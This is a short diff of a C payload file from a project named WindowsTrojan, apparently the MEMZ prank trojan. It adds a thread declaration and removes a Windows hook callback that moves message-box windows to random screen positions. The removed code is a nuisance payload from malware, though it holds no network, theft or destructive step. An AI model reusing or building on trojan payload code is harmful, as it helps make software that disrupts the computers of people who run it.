+++ WindowsTrojan/Source/Payloads/PayloadMessageBox.c
@@ -1,5 +1,7 @@
 #include "../MEMZ.h"
 
+DWORD WINAPI messageBoxThread(LPVOID);
+
 PAYLOADFUNCTIONDEFAULT(payloadMessageBox) {
 	PAYLOADHEAD
 
@@ -14,22 +16,4 @@ DWORD WINAPI messageBoxThread(LPVOID parameter) {
 	UnhookWindowsHookEx(hook);
 
 	return 0;
-}
-
-LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
-	if (nCode == HCBT_CREATEWND) {
-		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;
-
-		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
-			HWND hwnd = (HWND)wParam;
-
-			int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
-			int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);
-
-			pcs->x = x;
-			pcs->y = y;
-		}
-	}
-
-	return CallNextHookEx(0, nCode, wParam, lParam);
 }
